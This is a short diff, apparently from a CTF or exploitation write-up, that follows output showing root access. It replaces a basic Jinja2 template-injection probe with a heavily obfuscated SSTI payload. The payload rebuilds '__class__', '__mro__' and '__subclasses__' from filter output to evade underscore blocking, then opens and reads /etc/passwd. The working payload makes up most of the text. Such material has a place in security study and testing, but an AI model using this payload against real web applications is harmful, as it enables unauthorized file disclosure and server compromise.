@@ -244,7 +244,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 We are root.
 
-T
+Ta
 ```
-{{ ''.__class__.__base__ }}
+{{ [[''|attr([[[]|map|string|list][0][20]*2,'class',[[]|map|string|list][0][20]*2]|join)|attr([[[]|map|string|list][0][20]*2,'mro',[[]|map|string|list][0][20]*2]|join)][0][2]|attr([[[]|map|string|list][0][20]*2,'subclasses',[[]|map|string|list][0][20]*2]|join)()][0][40](['/etc/', [1|float|string|list][0][1], 'passwd']|join,'r')|attr('read')() }}
 ```
